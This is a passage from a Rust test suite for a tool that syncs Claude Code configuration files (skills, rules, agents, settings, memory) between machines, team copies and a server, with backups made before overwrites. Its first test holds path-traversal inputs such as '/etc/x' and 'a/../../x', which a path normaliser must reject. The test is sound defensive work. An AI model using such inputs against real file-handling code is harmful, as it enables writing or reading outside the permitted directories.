        let date = chrono::Local::now().format("%Y-%m-%d");
        home.join(".claude")
            .join("backups")
            .join(format!("tcb-sync-{date}"))
    }

    fn read(path: &Path) -> String {
        std::fs::read_to_string(path).unwrap_or_else(|e| panic!("{path:?}: {e}"))
    }

    #[test]
    fn pulled_paths_never_reach_outside_their_directory() {
        for bad in [
            "",
            "/etc/x",
            "\\x",
            "../x",
            "a/../../x",
            "a/..",
            "C:/x",
            "c:x",
            "a//b",
            "./a",
            "a/./b",
            "a/",
        ] {
            assert_eq!(normalize_relative(bad), "", "{bad:?}");
        }
        assert_eq!(normalize_relative("a/b.md"), "a/b.md");
        assert_eq!(normalize_relative("a\\b.md"), "a/b.md");
        assert_eq!(
            normalize_relative("..md"),
            "..md",
            "a name, not a parent dir"
        );
    }

    #[tokio::test]
    async fn startup_pull_keeps_local_only_files_and_backs_up_what_it_replaces() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        {
            let mut a = admin.lock().unwrap();
            a.states
                .insert("claude-skills".into(), (json!({"a/SKILL.md": b64("A")}), 4));
            a.states
                .insert("claude-md".into(), (json!("server copy from last week"), 9));
        }
        let home = tmp.path().join("home");
        let claude = home.join(".claude");
        std::fs::create_dir_all(claude.join("skills/a")).unwrap();
        std::fs::create_dir_all(claude.join("skills/new")).unwrap();
        std::fs::write(claude.join("skills/a/SKILL.md"), "A").unwrap();
        // Written while the app was closed or signed out.
        std::fs::write(claude.join("skills/new/SKILL.md"), "NEW SKILL").unwrap();
        std::fs::write(claude.join("CLAUDE.md"), "local edit made while signed out").unwrap();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        // Exactly what `start()` does: pull everything, then push everything.
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        let _ = mgr.do_push_initial(&push_state).await;

        assert_eq!(read(&claude.join("skills/new/SKILL.md")), "NEW SKILL");
        let server = admin.lock().unwrap().states["claude-skills"].0.clone();
        assert_eq!(server["new/SKILL.md"], b64("NEW SKILL"), "and it went up");
        assert_eq!(server["a/SKILL.md"], b64("A"));
        // The local edit survives start and goes up; the server's older
        // copy is kept in the backups.
        assert_eq!(
            read(&claude.join("CLAUDE.md")),
            "local edit made while signed out"
        );
        assert_eq!(
            admin.lock().unwrap().states["claude-md"].0,
            json!("local edit made while signed out")
        );
        let root = backup_root(&home);
        assert_eq!(
            read(&root.join("server/claude-md.json")),
            "\"server copy from last week\""
        );
    }

    /// `hours` after the fake admin's `synced_at` (before it when negative).
    fn from_synced_at(hours: i64) -> SystemTime {
        SystemTime::from(
            registry::parse_timestamp(FAKE_SYNCED_AT).unwrap() + Duration::hours(hours),
        )
    }

    /// A start where nothing says which side changed a file: no baseline
    /// for `claude-skills` and `claude-md` (the first start of a build that
    /// keeps one), and a stale one for `claude-rules` and
    /// `claude-settings-local` that neither side still holds. Each local
    /// copy differs from the server's and was last modified at `local_mtime`.
    async fn start_without_a_usable_baseline(
        tmp: &Path,
        local_mtime: SystemTime,
    ) -> (SharedAdmin, PathBuf) {
        let admin = SharedAdmin::default();
        {
            let mut a = admin.lock().unwrap();
            a.states.insert(
                "claude-skills".into(),
                (
                    json!({"a/SKILL.md": b64("server copy"), "b/SKILL.md": b64("B")}),
                    4,
                ),
            );
            a.states.insert(
                "claude-rules".into(),
                (json!({"r.md": b64("server copy")}), 7),
            );
            a.states
                .insert("claude-md".into(), (json!("server copy"), 9));
            a.states
                .insert("claude-settings-local".into(), (json!({"a": "server"}), 3));
            a.states.insert(
                "claude-settings".into(),
                (json!({ current_platform(): {"theme": "server"} }), 2),
            );
        }
        let store = tmp.join("store");
        write_registry(&store, vec![]);
        std::fs::write(
            store.join("sync_baseline.json"),
            serde_json::to_vec(&json!({
                "profileId": null,
                "keys": {
                    "claude-rules": {"version": 5, "files": {"r.md": sha256_hex(b"as synced")}},
                    "claude-settings-local": {
                        "version": 2,
                        "sha256": sha256_hex(json!({"a": "as synced"}).to_string().as_bytes())
                    }
                }
            }))
            .unwrap(),
        )
        .unwrap();
        let home = tmp.join("home");
        let claude = home.join(".claude");
        for (rel, body) in [
            ("skills/a/SKILL.md", "local copy"),
            ("skills/new/SKILL.md", "NEW SKILL"),
            ("rules/r.md", "local copy"),
            ("CLAUDE.md", "local copy"),
            ("settings.local.json", "{\"a\": \"local\"}"),
            ("settings.json", "{\"theme\": \"local\"}"),
        ] {
            let path = claude.join(rel);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(&path, body).unwrap();
            set_mtime(&path, local_mtime);
        }
        let mgr = isolated_manager(&admin, tmp).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        // Exactly what `start()` does: pull everything, then push everything.
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        let _ = mgr.do_push_initial(&push_state).await;
        (admin, home)
    }

    #[tokio::test]
    async fn a_start_without_a_usable_baseline_takes_the_servers_newer_copy() {
        // The other machine's edits, made after this machine's copies.
        let tmp = tempfile::tempdir().unwrap();
        let (admin, home) = start_without_a_usable_baseline(tmp.path(), from_synced_at(-24)).await;
        let claude = home.join(".claude");
        let root = backup_root(&home);

        // The server's copy lands, and the local one is in the backups.
        for rel in ["skills/a/SKILL.md", "rules/r.md", "CLAUDE.md"] {
            assert_eq!(read(&claude.join(rel)), "server copy", "{rel}");
            assert_eq!(read(&root.join(rel)), "local copy", "{rel}");
        }
        let settings_local: Value =
            serde_json::from_str(&read(&claude.join("settings.local.json"))).unwrap();
        assert_eq!(settings_local, json!({"a": "server"}));
        assert_eq!(
            read(&root.join("settings.local.json")),
            "{\"a\": \"local\"}"
        );
        // A file only the server has is written; one only this machine has
        // stays and goes up.
        assert_eq!(read(&claude.join("skills/b/SKILL.md")), "B");
        assert_eq!(read(&claude.join("skills/new/SKILL.md")), "NEW SKILL");

        // Nothing older went over the server.
        let a = admin.lock().unwrap();
        let skills = &a.states["claude-skills"].0;
        assert_eq!(skills["a/SKILL.md"], b64("server copy"));
        assert_eq!(skills["new/SKILL.md"], b64("NEW SKILL"));
        assert_eq!(
            a.states["claude-rules"],
            (json!({"r.md": b64("server copy")}), 7)
        );
        assert_eq!(a.states["claude-md"], (json!("server copy"), 9));
        assert_eq!(
            a.states["claude-settings-local"],
            (json!({"a": "server"}), 3)
        );
        for key in ["claude-rules", "claude-md", "claude-settings-local"] {
            assert!(
                !a.puts.iter().any(|k| k == key),
                "{key} pushed: {:?}",
                a.puts
            );
        }
        // This platform's slot has no other writer, so its local copy is
        // never taken for a stale one.
        assert_eq!(
            read(&claude.join("settings.json")),
            "{\"theme\": \"local\"}"
        );
        assert_eq!(
            a.states["claude-settings"].0[current_platform()],
            json!({"theme": "local"})
        );
    }

    #[tokio::test]
    async fn a_start_without_a_usable_baseline_keeps_a_local_copy_newer_than_the_servers() {
        // Edited here while not syncing, after the server's last write.
        let tmp = tempfile::tempdir().unwrap();
        let (admin, home) = start_without_a_usable_baseline(tmp.path(), from_synced_at(24)).await;
        let claude = home.join(".claude");
        let root = backup_root(&home);

        for rel in ["skills/a/SKILL.md", "rules/r.md", "CLAUDE.md"] {
            assert_eq!(read(&claude.join(rel)), "local copy", "{rel}");
        }
        assert_eq!(
            read(&claude.join("settings.local.json")),
            "{\"a\": \"local\"}"
        );
        assert_eq!(read(&claude.join("skills/b/SKILL.md")), "B");
        // The server's copies are kept in the backups...
        assert_eq!(
            read(&root.join("server/claude-skills/a/SKILL.md")),
            "server copy"
        );
        assert_eq!(read(&root.join("server/claude-rules/r.md")), "server copy");
        assert_eq!(read(&root.join("server/claude-md.json")), "\"server copy\"");
        let kept: Value =
            serde_json::from_str(&read(&root.join("server/claude-settings-local.json"))).unwrap();
        assert_eq!(kept, json!({"a": "server"}));
        // ...and the local edits went up.
        let a = admin.lock().unwrap();
        let skills = &a.states["claude-skills"].0;
        assert_eq!(skills["a/SKILL.md"], b64("local copy"));
        assert_eq!(skills["new/SKILL.md"], b64("NEW SKILL"));
        assert_eq!(a.states["claude-rules"].0["r.md"], b64("local copy"));
        assert_eq!(a.states["claude-md"], (json!("local copy"), 10));
        assert_eq!(a.states["claude-settings-local"].0, json!({"a": "local"}));
    }

    /// A store whose baseline says `key` was last in sync at `version` with
    /// a value hashing to `sha256`.
    fn write_file_baseline(store: &Path, key: &str, version: i64, sha256: &str) {
        std::fs::write(
            store.join("sync_baseline.json"),
            serde_json::to_vec(&json!({
                "profileId": null,
                "keys": {key: {"version": version, "sha256": sha256}}
            }))
            .unwrap(),
        )
        .unwrap();
    }

    #[tokio::test]
    async fn a_file_unchanged_since_the_last_sync_takes_the_servers_update_at_startup() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin
            .lock()
            .unwrap()
            .states
            .insert("claude-md".into(), (json!("edited on the PC"), 10));
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        write_file_baseline(&store, "claude-md", 9, &sha256_hex(b"as synced"));
        let home = tmp.path().join("home");
        let claude_md = home.join(".claude").join("CLAUDE.md");
        std::fs::create_dir_all(claude_md.parent().unwrap()).unwrap();
        std::fs::write(&claude_md, "as synced").unwrap();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        let _ = mgr.do_push_initial(&push_state).await;
        assert_eq!(read(&claude_md), "edited on the PC");
        assert_eq!(read(&backup_root(&home).join("CLAUDE.md")), "as synced");
        assert_eq!(
            admin.lock().unwrap().states["claude-md"].1,
            10,
            "nothing pushed back"
        );
        let saved: Value =
            serde_json::from_slice(&std::fs::read(store.join("sync_baseline.json")).unwrap())
                .unwrap();
        assert_eq!(saved["keys"]["claude-md"]["version"], 10);
        assert_eq!(
            saved["keys"]["claude-md"]["sha256"],
            sha256_hex(b"edited on the PC")
        );
    }

    #[tokio::test]
    async fn a_start_where_neither_side_moved_leaves_the_file_alone() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        // The server's copy is spelled differently (another machine's
        // formatting); the version says nothing changed.
        admin
            .lock()
            .unwrap()
            .states
            .insert("claude-settings-local".into(), (json!({"a": 1, "b": 2}), 4));
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        let local = "{\n    \"b\": 2,\n    \"a\": 1\n}\n";
        write_file_baseline(
            &store,
            "claude-settings-local",
            4,
            &sha256_hex(json!({"a": 1, "b": 2}).to_string().as_bytes()),
        );
        let home = tmp.path().join("home");
        let path = home.join(".claude").join("settings.local.json");
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, local).unwrap();
        let past = SystemTime::now() - std::time::Duration::from_secs(3600);
        set_mtime(&path, past);
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        assert_eq!(read(&path), local);
        assert_eq!(mtime_of(&path), past);
        assert!(!backup_root(&home).exists());
        assert_eq!(
            push_state.lock().await.known_version["claude-settings-local"],
            4
        );
    }

    #[tokio::test]
    async fn startup_pull_resolves_each_directory_file_against_the_last_sync() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let home = tmp.path().join("home");
        let agents = home.join(".claude").join("agents");
        std::fs::create_dir_all(&agents).unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        // The last sync (version 3) had v1 of three files.
        let v1 = sha256_hex(b"v1");
        std::fs::write(
            store.join("sync_baseline.json"),
            serde_json::to_vec(&json!({
                "profileId": null,
                "keys": {"claude-agents": {"version": 3, "files": {
                    "edited-there.md": v1, "edited-here.md": v1, "edited-both.md": v1
                }}}
            }))
            .unwrap(),
        )
        .unwrap();
        for (name, body) in [
            ("edited-there.md", "v1"),
            ("edited-here.md", "local v2"),
            ("edited-both.md", "local v2"),
            ("local-only.md", "L"),
        ] {
            std::fs::write(agents.join(name), body).unwrap();
        }
        admin.lock().unwrap().states.insert(
            "claude-agents".into(),
            (
                json!({
                    "edited-there.md": b64("server v2"),
                    "edited-here.md": b64("v1"),
                    "edited-both.md": b64("server v2"),
                    "server-only.md": b64("S"),
                }),
                5,
            ),
        );
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();

        let root = backup_root(&home);
        // Unchanged here: the other machine's edit arrives, the old copy is kept.
        assert_eq!(read(&agents.join("edited-there.md")), "server v2");
        assert_eq!(read(&root.join("agents/edited-there.md")), "v1");
        // Unchanged there: the local edit stays for the push.
        assert_eq!(read(&agents.join("edited-here.md")), "local v2");
        // Changed on both: the local copy stays, the server's is kept aside.
        assert_eq!(read(&agents.join("edited-both.md")), "local v2");
        assert_eq!(
            read(&root.join("server/claude-agents/edited-both.md")),
            "server v2"
        );
        assert_eq!(read(&agents.join("local-only.md")), "L");
        assert_eq!(read(&agents.join("server-only.md")), "S");
        assert_eq!(push_state.lock().await.known_version["claude-agents"], 5);

        // The initial push sends the kept local edits up.
        mgr.push_directory("claude-agents", &push_state)
            .await
            .unwrap();
        let (server, version) = admin.lock().unwrap().states["claude-agents"].clone();
        assert_eq!(server["edited-here.md"], b64("local v2"));
        assert_eq!(server["edited-both.md"], b64("local v2"));
        assert_eq!(server["local-only.md"], b64("L"));
        assert_eq!(version, 6);
        // ...and the baseline now names what the server holds.
        let saved: Value =
            serde_json::from_slice(&std::fs::read(store.join("sync_baseline.json")).unwrap())
                .unwrap();
        let entry = &saved["keys"]["claude-agents"];
        assert_eq!(entry["version"], 6);
        assert_eq!(entry["files"]["edited-here.md"], sha256_hex(b"local v2"));
    }

    #[tokio::test]
    async fn a_baseline_from_another_profile_is_ignored() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let home = tmp.path().join("home");
        let agents = home.join(".claude").join("agents");
        std::fs::create_dir_all(&agents).unwrap();
        let store = tmp.path().join("store");
        write_registry(&store, vec![]);
        std::fs::write(
            store.join("sync_baseline.json"),
            serde_json::to_vec(&json!({
                "profileId": "someone-else",
                "keys": {"claude-agents": {"version": 3, "files": {"x.md": sha256_hex(b"mine")}}}
            }))
            .unwrap(),
        )
        .unwrap();
        std::fs::write(agents.join("x.md"), "mine").unwrap();
        admin
            .lock()
            .unwrap()
            .states
            .insert("claude-agents".into(), (json!({"x.md": b64("theirs")}), 4));
        let mgr = isolated_manager(&admin, tmp.path()).await;
        *mgr.profile_id.lock().await = Some("me".into());
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        // Without a baseline of its own, the local copy is kept.
        assert_eq!(read(&agents.join("x.md")), "mine");
        assert_eq!(
            read(&backup_root(&home).join("server/claude-agents/x.md")),
            "theirs"
        );
    }

    #[tokio::test]
    async fn a_later_pull_moves_what_the_server_removed_to_the_backups() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let home = tmp.path().join("home");
        let commands = home.join(".claude").join("commands");
        std::fs::create_dir_all(&commands).unwrap();
        std::fs::write(commands.join("keep.md"), "K").unwrap();
        std::fs::write(commands.join("gone.md"), "G").unwrap();
        // Never synced (too large, or not a synced extension): never touched.
        std::fs::write(commands.join("notes.txt"), "N").unwrap();
        let big = "x".repeat((DIR_MAX_FILE_BYTES + 1) as usize);
        std::fs::write(commands.join("big.md"), &big).unwrap();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.apply_state(
            "claude-commands",
            &json!({"keep.md": b64("K2")}),
            &push_state,
        )
        .await
        .unwrap();

        let root = backup_root(&home);
        assert_eq!(read(&commands.join("keep.md")), "K2");
        assert_eq!(read(&root.join("commands/keep.md")), "K");
        assert!(!commands.join("gone.md").exists());
        assert_eq!(read(&root.join("commands/gone.md")), "G");
        assert_eq!(read(&commands.join("notes.txt")), "N");
        assert_eq!(read(&commands.join("big.md")), big);

        // A second pull replacing the same file never overwrites the first
        // backup.
        mgr.apply_state(
            "claude-commands",
            &json!({"keep.md": b64("K3")}),
            &push_state,
        )
        .await
        .unwrap();
        assert_eq!(read(&root.join("commands/keep.md")), "K");
        let kept: Vec<String> = std::fs::read_dir(root.join("commands"))
            .unwrap()
            .map(|e| read(&e.unwrap().path()))
            .collect();
        assert!(kept.contains(&"K2".to_string()), "{kept:?}");

        // Identical bytes: nothing written, nothing backed up.
        let past = SystemTime::now() - std::time::Duration::from_secs(3600);
        set_mtime(&commands.join("keep.md"), past);
        let backups_before = std::fs::read_dir(root.join("commands")).unwrap().count();
        mgr.apply_state(
            "claude-commands",
            &json!({"keep.md": b64("K3")}),
            &push_state,
        )
        .await
        .unwrap();
        assert_eq!(mtime_of(&commands.join("keep.md")), past);
        assert_eq!(
            std::fs::read_dir(root.join("commands")).unwrap().count(),
            backups_before
        );
    }

    #[tokio::test]
    async fn a_backup_retried_with_the_same_bytes_keeps_one_copy() {
        // A write that keeps failing after its backup (a locked file, a
        // name this system refuses) is retried on every poll.
        let tmp = tempfile::tempdir().unwrap();
        let slot = tmp.path().join("commands").join("keep.md");
        let first = write_backup(slot.clone(), b"K").await.unwrap();
        assert_eq!(first, slot);
        assert_eq!(write_backup(slot.clone(), b"K").await.unwrap(), first);
        // Other bytes never overwrite it; the same other bytes again reuse
        // their own copy.
        let second = write_backup(slot.clone(), b"K2").await.unwrap();
        assert_ne!(second, first);
        assert_eq!(write_backup(slot.clone(), b"K2").await.unwrap(), second);
        assert_eq!(
            std::fs::read_dir(tmp.path().join("commands"))
                .unwrap()
                .count(),
            2
        );
        assert_eq!(read(&first), "K");
        assert_eq!(read(&second), "K2");
        // A file merely named like it is not taken for it.
        std::fs::write(tmp.path().join("commands").join("keep.mdx"), "K3").unwrap();
        assert_ne!(
            write_backup(slot.clone(), b"K3").await.unwrap(),
            tmp.path().join("commands").join("keep.mdx")
        );
    }

    #[tokio::test]
    async fn global_files_and_mnemos_settings_are_backed_up_before_a_pull_replaces_them() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let home = tmp.path().join("home");
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        std::fs::write(home.join(".claude").join("CLAUDE.md"), "mine").unwrap();
        std::fs::write(tmp.path().join("store").join("settings.json"), "{\"a\": 1}").unwrap();
        std::fs::write(home.join(".claude.json"), "{\"mcpServers\": {}, \"n\": 1}").unwrap();

        mgr.apply_state("claude-md", &json!("theirs"), &push_state)
            .await
            .unwrap();
        mgr.apply_state("settings", &json!({"a": 2}), &push_state)
            .await
            .unwrap();
        mgr.apply_state(
            CLAUDE_JSON_MCP_SYNC_KEY,
            &json!({ current_platform(): {"s": {}} }),
            &push_state,
        )
        .await
        .unwrap();
        // Not text: refused rather than written as an empty file.
        assert!(mgr
            .apply_state("claude-md", &json!(null), &push_state)
            .await
            .is_err());

        let root = backup_root(&home);
        assert_eq!(read(&home.join(".claude").join("CLAUDE.md")), "theirs");
        assert_eq!(read(&root.join("CLAUDE.md")), "mine");
        assert_eq!(
            read(&root.join("mnemos").join("settings.json")),
            "{\"a\": 1}"
        );
        assert_eq!(
            read(&root.join("home").join(".claude.json")),
            "{\"mcpServers\": {}, \"n\": 1}"
        );
        #[cfg(unix)]
        assert_eq!(mode_of(&root.join("home").join(".claude.json")), 0o600);
    }

    #[tokio::test]
    async fn a_pulled_memory_file_never_overwrites_a_newer_local_one() {
        let tmp = tempfile::tempdir().unwrap();
        let claude = tmp.path().join(".claude");
        let project = claude.join("projects").join("-x");
        let memory = project.join("memory");
        std::fs::create_dir_all(&memory).unwrap();
        let backups = Backups {
            claude_dir: claude.clone(),
            claude_json: tmp.path().join(".claude.json"),
            root: claude.join("backups").join("t"),
        };
        std::fs::write(memory.join("newer.md"), "edited here").unwrap();
        std::fs::write(memory.join("older.md"), "old").unwrap();
        set_mtime(
            &memory.join("older.md"),
            UNIX_EPOCH + std::time::Duration::from_millis(1000),
        );
        let entry = |c: &str, mtime: i64| json!({"content": B64.encode(c), "mtime": mtime});
        let payload = json!({
            "files": {"newer.md": entry("from server", 5000), "older.md": entry("from server", 5000)},
            "memoryMd": entry("md", 5000)
        });
        apply_memory_payload(&project, &payload, &backups)
            .await
            .unwrap();
        assert_eq!(read(&memory.join("newer.md")), "edited here");
        assert_eq!(read(&memory.join("older.md")), "from server");
        assert_eq!(
            read(&backups.root.join("projects/-x/memory/older.md")),
            "old"
        );
        assert_eq!(read(&project.join("MEMORY.md")), "md");
    }

    #[tokio::test]
    async fn claude_codes_skill_cache_is_never_synced_written_or_removed() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let home = tmp.path().join("home");
        let skills = home.join(".claude").join("skills");
        for (rel, body) in [
            ("mine/SKILL.md", "MINE"),
            ("synced/acct-bucket/pdf/SKILL.md", "CACHE"),
            (".trash/old/SKILL.md", "TRASH"),
            ("mine/.draft.md", "DRAFT"),
        ] {
            let path = skills.join(rel);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, body).unwrap();
        }
        let cfg = DIRECTORIES
            .iter()
            .find(|d| d.sync_key == "claude-skills")
            .unwrap();
        assert_eq!(
            serialize_directory(&skills, cfg).unwrap(),
            json!({"mine/SKILL.md": b64("MINE")})
        );

        // What an older build pushed from the other machine's cache.
        admin.lock().unwrap().states.insert(
            "claude-skills".into(),
            (
                json!({
                    "mine/SKILL.md": b64("MINE"),
                    "synced/other-bucket/xlsx/SKILL.md": b64("THEIR CACHE"),
                    ".trash/x/SKILL.md": b64("THEIR TRASH"),
                    "mine/.hidden/SKILL.md": b64("HIDDEN"),
                }),
                2,
            ),
        );
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let server = admin.lock().unwrap().states["claude-skills"].0.clone();
        mgr.apply_state("claude-skills", &server, &push_state)
            .await
            .unwrap();
        assert!(!skills.join("synced/other-bucket").exists());
        assert!(!skills.join(".trash/x").exists());
        assert!(!skills.join("mine/.hidden").exists());
        // The mirror leaves this machine's cache alone.
        assert_eq!(
            read(&skills.join("synced/acct-bucket/pdf/SKILL.md")),
            "CACHE"
        );
        assert_eq!(read(&skills.join(".trash/old/SKILL.md")), "TRASH");
        assert_eq!(read(&skills.join("mine/.draft.md")), "DRAFT");
        assert!(
            !backup_root(&home).exists(),
            "nothing was replaced or removed"
        );

        // The push drops the other machine's cache from the server.
        mgr.push_directory("claude-skills", &push_state)
            .await
            .unwrap();
        assert_eq!(
            admin.lock().unwrap().states["claude-skills"].0,
            json!({"mine/SKILL.md": b64("MINE")})
        );
    }

    // ---- No-op pushes ----

    #[tokio::test]
    async fn a_start_with_nothing_changed_writes_nothing() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        {
            let mut a = admin.lock().unwrap();
            a.states.insert("claude-md".into(), (json!("same"), 5));
            a.states
                .insert("claude-agents".into(), (json!({"x.md": b64("X")}), 7));
            a.states
                .insert("projects".into(), (json!({"projects": []}), 2));
        }
        let claude = tmp.path().join("home").join(".claude");
        std::fs::create_dir_all(claude.join("agents")).unwrap();
        std::fs::write(claude.join("CLAUDE.md"), "same").unwrap();
        std::fs::write(claude.join("agents/x.md"), "X").unwrap();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        // A team owner: the startup push still refreshes the team's copy.
        mgr.set_team(Some("t1".into()), Some("Team".into()), true)
            .await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        assert!(mgr.do_push_initial(&push_state).await.is_empty());

        {
            let a = admin.lock().unwrap();
            assert!(
                a.puts.iter().all(|k| k == "projects"),
                "only the registry may be rewritten: {:?}",
                a.puts
            );
            assert_eq!(a.states["claude-md"].1, 5);
            assert_eq!(a.states["claude-agents"].1, 7);
            let team = |key: &str| {
                a.team_states
                    .get(&("t1".to_string(), key.to_string()))
                    .cloned()
            };
            assert_eq!(team("claude-md").map(|(v, _)| v), Some(json!("same")));
            assert_eq!(
                team("claude-agents").map(|(v, _)| v),
                Some(json!({"x.md": b64("X")}))
            );
        }

        // A second push of the same content goes nowhere near the server.
        let before = admin.lock().unwrap().requests.len();
        mgr.push_global_file("claude-md", &push_state)
            .await
            .unwrap();
        mgr.push_directory("claude-agents", &push_state)
            .await
            .unwrap();
        let a = admin.lock().unwrap();
        assert!(
            a.requests[before..].iter().all(|(m, _)| m == "GET"),
            "{:?}",
            &a.requests[before..]
        );
    }

    #[tokio::test]
    async fn a_pulled_memory_file_keeps_the_payload_mtime() {
        let tmp = tempfile::tempdir().unwrap();
        let claude = tmp.path().join(".claude");
        let project = claude.join("projects").join("-x");
        let backups = Backups {
            claude_dir: claude.clone(),
            claude_json: tmp.path().join(".claude.json"),
            root: claude.join("backups").join("t"),
        };
        let mtime: i64 = 1_790_000_000_123;
        let payload = json!({
            "files": {"a.md": {"content": B64.encode("A"), "mtime": mtime}},
            "memoryMd": {"content": B64.encode("M"), "mtime": mtime}
        });
        apply_memory_payload(&project, &payload, &backups)
            .await
            .unwrap();
        assert_eq!(mtime_ms(&project.join("memory/a.md")).await, Some(mtime));
        assert_eq!(mtime_ms(&project.join("MEMORY.md")).await, Some(mtime));
        // So the push built from it offers exactly the server's entry.
        let built = build_memory_payload(&project).unwrap();
        assert_eq!(built["files"]["a.md"]["mtime"], mtime);
    }

    // ---- Platform envelopes ----

    #[tokio::test]
    async fn a_push_never_reverts_the_other_platforms_newer_slot() {
        let tmp = tempfile::tempdir().unwrap();
        let this = current_platform();
        let other = if this == "win32" { "darwin" } else { "win32" };
        let admin = SharedAdmin::default();
        {
            let mut a = admin.lock().unwrap();
            a.states.insert(
                "claude-settings".into(),
                (json!({ this: {"model": "a"}, other: {"model": "OLD"} }), 3),
            );
            // The other machine pushes its slot right after this machine's
            // first read (its own CAS write).
            let hook: AfterGet = Box::new(move |states| {
                states.insert(
                    "claude-settings".into(),
                    (json!({ this: {"model": "a"}, other: {"model": "NEW"} }), 4),
                );
            });
            a.after_get = Some(("claude-settings".into(), hook));
        }
        let mgr = isolated_manager(&admin, tmp.path()).await;
        std::fs::write(
            tmp.path()
                .join("home")
                .join(".claude")
                .join("settings.json"),
            "{\"model\": \"b\"}",
        )
        .unwrap();
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.push_global_file("claude-settings", &push_state)
            .await
            .unwrap();
        let (server, version) = admin.lock().unwrap().states["claude-settings"].clone();
        assert_eq!(server[other]["model"], "NEW", "{server}");
        assert_eq!(server[this]["model"], "b");
        assert_eq!(version, 5);
        assert!(admin.lock().unwrap().lww.is_empty());
    }

    #[tokio::test]
    async fn unchanged_mcp_servers_cost_no_request() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let claude_json = tmp.path().join("home").join(".claude.json");
        std::fs::write(
            &claude_json,
            serde_json::to_vec(&json!({"numStartups": 1, "mcpServers": {"s": {"command": "x"}}}))
                .unwrap(),
        )
        .unwrap();
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        const PATH: &str = "/api/tcb/state/claude-json-mcp-servers-v2";

        mgr.push_claude_json_mcp(&push_state).await.unwrap();
        // Claude Code rewrites the file with other changes only.
        std::fs::write(
            &claude_json,
            serde_json::to_vec(&json!({"numStartups": 2, "mcpServers": {"s": {"command": "x"}}}))
                .unwrap(),
        )
        .unwrap();
        mgr.push_claude_json_mcp(&push_state).await.unwrap();
        {
            let a = admin.lock().unwrap();
            assert_eq!(a.count("GET", PATH), 1);
            assert_eq!(a.count("POST", "/api/tcb/state"), 1);
            assert_eq!(
                a.states[CLAUDE_JSON_MCP_SYNC_KEY].0,
                json!({ current_platform(): {"s": {"command": "x"}} })
            );
        }

        // A pull that finds the file already holding its slot counts too.
        let fresh = Arc::new(AsyncMutex::new(PushState::default()));
        let server = admin.lock().unwrap().states[CLAUDE_JSON_MCP_SYNC_KEY].clone();
        mgr.apply_pulled(
            &SyncStateResponse {
                key: CLAUDE_JSON_MCP_SYNC_KEY.into(),
                value: server.0,
                version: server.1,
                synced_at: String::new(),
            },
            &fresh,
        )
        .await;
        let before = admin.lock().unwrap().requests.len();
        mgr.push_claude_json_mcp(&fresh).await.unwrap();
        assert_eq!(admin.lock().unwrap().requests.len(), before);
    }

    // ---- Team pull ----

    #[tokio::test]
    async fn a_member_gets_the_owners_update_to_an_existing_file() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().team_states.insert(
            ("t1".into(), "claude-rules".into()),
            (
                json!({
                    "process.md": b64("owner v2"),
                    "new.md": b64("NEW"),
                    "retired.md": b64("R"),
                    "__deleted": {"retired.md": now_ms()}
                }),
                2,
            ),
        );
        let home = tmp.path().join("home");
        let rules = home.join(".claude").join("rules");
        std::fs::create_dir_all(&rules).unwrap();
        std::fs::write(rules.join("process.md"), "member has v1").unwrap();
        std::fs::write(rules.join("mine.md"), "MINE").unwrap();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        mgr.set_team(Some("t1".into()), Some("Team".into()), false)
            .await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.do_pull_team(&push_state, None).await;
        assert_eq!(read(&rules.join("process.md")), "owner v2");
        assert_eq!(
            read(&backup_root(&home).join("rules/process.md")),
            "member has v1"
        );
